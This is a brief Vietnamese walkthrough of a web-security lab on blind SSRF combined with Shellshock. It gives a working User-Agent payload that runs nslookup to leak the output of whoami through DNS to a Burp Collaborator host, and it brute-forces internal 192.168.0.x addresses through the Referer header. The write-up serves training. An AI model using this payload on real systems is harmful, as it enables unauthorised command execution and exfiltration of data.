## Blind SSRF with Shellshock exploitation

***Lab này sẽ hướng dẫn chúng ta tấn công shellshock mà không cần xác thực bằng cách sử đổi user-agent thành đoạn ngôn ngữ bash (description bảo vậy :v).***

Dưới đây là định nghĩa về 1 hàm shellshock thực thi hợp lệ

![](/imgs/SSRF/25.png?raw=true)

Ta sẽ bắt request của 1 post bất kì có **referer** và sửa **user-agent** lại thành đoạn lệnh tấn công shellshock.

```markdown
**User-Agent: () { :; }; /usr/bin/nslookup $(whoami).d2g3w36drwscrp50gyy9uuy4cvin6c.burpcollaborator.net**
```

Mục đích là để DNS tới Burp Collaborator + Referer sẽ sửa lại như ở description của lab để là 192.168.0.x:8080

Sau khi Brute từ 1->255 chúng ta sẽ Pool những request đã gửi tới, request sẽ có format domain là tên user ($(whoami)).host

![](/imgs/SSRF/26.png?raw=true)

Submit lên tên user là solve lab

![](/imgs/SSRF/27.png?raw=true)

### Tài liệu tham khảo
- OSWAP Shellshock: [https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)